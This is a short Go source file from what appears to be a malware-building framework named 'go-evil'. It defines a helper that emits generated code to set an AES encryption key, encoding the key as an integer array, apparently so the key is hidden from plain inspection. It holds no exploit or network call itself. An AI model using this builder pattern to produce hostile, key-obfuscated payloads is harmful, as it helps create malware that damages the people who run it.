package configuration

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
	"github.com/TeamPhoneix/go-evil/utility/tools"
)

// Sets the aes key used for encrypting
func Set_aes_key(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)

	system_call := "set_aes_key"
	value = tools.Erase_delimiter(value, []string{"\""}, -1)

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr []int){", system_call),
		"key := spine.alpha.construct_string(repr)",
		"spine.crypt.set_aes_key(key)",
		"}"})

	// Construct our int array
	parameter := data_object.Generate_int_array_parameter(value)

	return []string{fmt.Sprintf("%s(%s)", system_call, parameter)}, structure.Send(data_object)
}
